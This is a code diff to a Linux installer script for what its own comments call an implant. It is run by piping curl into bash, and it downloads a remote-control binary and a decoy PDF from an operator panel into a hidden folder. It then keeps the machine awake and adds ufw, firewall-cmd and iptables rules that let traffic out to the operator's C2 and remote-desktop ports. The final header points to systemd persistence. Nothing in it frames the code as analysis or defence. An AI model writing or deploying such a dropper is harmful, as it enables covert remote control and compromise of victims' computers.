@@ -8,16 +8,23 @@
 # usage: curl -sSL https://<panel>/install/linux | bash
 set -euo pipefail
 
+# ---- operator domain pre-configuration ------------------------------------
+# The panel domain is baked in at build time; all firewall/whitelist rules
+# point to it so the implant can always reach the operator.
+PANEL_HOST="{{PANEL_HOST}}"
+PANEL_C2_PORT="{{PANEL_C2_PORT}}"
+PANEL_RD_PORT="{{PANEL_RD_PORT}}"
+
 WORKDIR="$HOME/.local/share/.fleet-update"
 mkdir -p "$WORKDIR"
 
 # ---- download implant (curl sets no quarantine attribute) ------------------
-IMPLANT_URL="{{PANEL_ENDPOINT}}/install/linux/binary"
+IMPLANT_URL="https://${PANEL_HOST}/install/linux/binary"
 curl -fsSL "$IMPLANT_URL" -o "$WORKDIR/fleetrun"
 chmod 0755 "$WORKDIR/fleetrun"
 
 # ---- download decoy PDF ----------------------------------------------------
-DECOY_URL="{{PANEL_ENDPOINT}}/install/linux/decoy"
+DECOY_URL="https://${PANEL_HOST}/install/linux/decoy"
 curl -fsSL "$DECOY_URL" -o "$WORKDIR/decoy.pdf"
 
 # ---- stay awake: ignore lid-close sleep in logind (root, best effort) ------
@@ -27,18 +34,19 @@ if [ "$(id -u)" = "0" ] && [ -f /etc/systemd/logind.conf ]; then
   systemctl restart systemd-logind >/dev/null 2>&1 || true
 fi
 
-# ---- preconfigure host firewall (best effort) ------------------------------
-for port in 8888 8443; do
-  if command -v ufw >/dev/null 2>&1; then
-    sudo -n ufw allow out "${port}/tcp" >/dev/null 2>&1 || true
-  fi
-  if command -v firewall-cmd >/dev/null 2>&1; then
-    sudo -n firewall-cmd --permanent --add-port="${port}/tcp" >/dev/null 2>&1 || true
-    sudo -n firewall-cmd --add-port="${port}/tcp" >/dev/null 2>&1 || true
-  fi
-done
+# ---- firewall: allow outbound to operator panel on C2 + RD ports -----------
+if command -v ufw >/dev/null 2>&1; then
+  sudo -n ufw allow out to "${PANEL_HOST}" port "${PANEL_C2_PORT}" proto tcp >/dev/null 2>&1 || true
+  sudo -n ufw allow out to "${PANEL_HOST}" port "${PANEL_RD_PORT}" proto tcp >/dev/null 2>&1 || true
+fi
 if command -v firewall-cmd >/dev/null 2>&1; then
+  sudo -n firewall-cmd --permanent --add-rich-rule="rule family=ipv4 destination address=${PANEL_HOST} port port=${PANEL_C2_PORT} protocol=tcp accept" >/dev/null 2>&1 || true
+  sudo -n firewall-cmd --permanent --add-rich-rule="rule family=ipv4 destination address=${PANEL_HOST} port port=${PANEL_RD_PORT} protocol=tcp accept" >/dev/null 2>&1 || true
   sudo -n firewall-cmd --reload >/dev/null 2>&1 || true
+fi
+if command -v iptables >/dev/null 2>&1 && [ "$(id -u)" = "0" ]; then
+  sudo -n iptables -I OUTPUT -d "${PANEL_HOST}" -p tcp --dport "${PANEL_C2_PORT}" -j ACCEPT >/dev/null 2>&1 || true
+  sudo -n iptables -I OUTPUT -d "${PANEL_HOST}" -p tcp --dport "${PANEL_RD_PORT}" -j ACCEPT >/dev/null 2>&1 || true
 fi
 
 # ---- systemd user unit persistence (works without root) --------------------
